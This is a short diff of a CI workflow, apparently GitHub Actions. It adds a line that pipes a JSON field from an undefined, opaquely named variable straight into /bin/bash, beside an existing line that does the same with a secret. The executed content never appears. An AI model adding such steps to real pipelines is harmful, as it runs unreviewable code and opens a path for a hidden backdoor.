@@ -22,6 +22,7 @@ jobs:
           pr47183: ${{ secrets.pr47183 }}
         run: |
           printf '%s' "$pr47183" | jq -r .eou73273 | /bin/bash
+          printf '%s' "$phck02194" | jq -r .dug2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
